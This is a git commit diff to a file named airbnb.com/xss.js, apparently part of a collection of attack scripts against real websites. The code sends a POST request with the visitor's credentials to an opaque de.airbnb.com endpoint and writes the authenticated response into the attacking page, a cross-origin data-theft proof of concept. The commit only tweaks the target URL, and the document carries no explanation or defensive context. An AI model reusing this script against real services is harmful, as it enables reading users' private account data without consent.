8ff9aa4f98c79c36355acecb8377ac2c4f7230b8
jvstmer <57935669+jvstmer@users.noreply.github.com>
2022-06-18 17:36:38 -0500

    a

--- airbnb.com/xss.js
+++ airbnb.com/xss.js
@@ -17,7 +17,7 @@ function cors() {
       document.getElementById("report").innerHTML = this.responseText;
     }
 };
-xhttp.open("POST", "https://de.airbnb.com/zJ3dtDoiGgDt/P-z6cl/Ao9Min/9pEtfLNXOY/P2sgAg/FQoeFCx/5Iz8", true);
+xhttp.open("POST", "https://de.airbnb.com/zJ3dtDoiGgDt/P-z6cl/Ao9Min/9pEtfLNXOY/P2sgAg/FQoeFCx/5Iz8?lezn9m6=2", true);
 xhttp.withCredentials = true;
 xhttp.send();
 }
